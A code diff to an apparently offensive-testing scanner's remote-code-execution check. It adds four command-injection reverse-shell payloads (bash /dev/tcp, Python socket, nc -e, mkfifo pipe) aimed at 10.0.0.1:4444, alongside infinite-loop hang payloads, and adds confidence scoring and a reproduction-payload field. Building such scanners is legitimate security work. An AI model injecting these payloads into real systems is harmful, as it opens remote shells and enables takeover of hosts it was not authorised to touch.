@@ -56,14 +56,16 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
             "import os; while True: pass", # Python infinite loop (Hang)
             "while(1){}", # Node infinite loop (Hang)
             
-            # Recursive Deletion (Simulated Safe Destruction - targets temp/logs usually)
-            # Note: Real rm -rf / is too dangerous even for this tool, let's stick to user intent of "Break" via exhaustion
-            
-            # Network Exhaustion via RCE
-            "; ping -c 10000 127.0.0.1",
+            # REVERSE SHELL ATTEMPTS (Real Hacker Mode)
+            # Tries to connect back to a dummy IP (10.0.0.1) just to trigger outbound traffic or hang
+            "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+            "; nc -e /bin/sh 10.0.0.1 4444",
+            "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f"
         ])
     fields = scenario.config.get("fields", ["ip", "host", "command"])
     issues = []
+    found_payloads = []
     leaked_data = [] 
     
     for field in fields:
@@ -118,13 +120,28 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
                 
             if suspicious:
                 issues.append(f"[CRITICAL] RCE Probability in '{field}': {', '.join(reasons)}")
+                found_payloads.append(p)
+
+    # Calculate Confidence
+    confidence = "LOW"
+    if issues:
+        # Check for Definitive Indicators
+        strong_indicators = ["Command Output:", "RCE Executed"]
+        if any(any(ind in i for ind in strong_indicators) for i in issues):
+             confidence = "CONFIRMED"
+        elif any("Crash/Hang" in i for i in issues):
+             confidence = "HIGH" # DoS is strong signal but not code exec proof
+        else:
+             confidence = "MEDIUM" # Heuristic/Node generic
 
     return {
         "scenario_id": scenario.id,
         "attack_type": "rce",
         "passed": len(issues) == 0,
+        "confidence": confidence if issues else "LOW",
         "details": {
             "issues": issues,
+            "reproduction_payload": found_payloads[0] if found_payloads else None,
             "leaked_data": list(set(leaked_data))
         }
     }
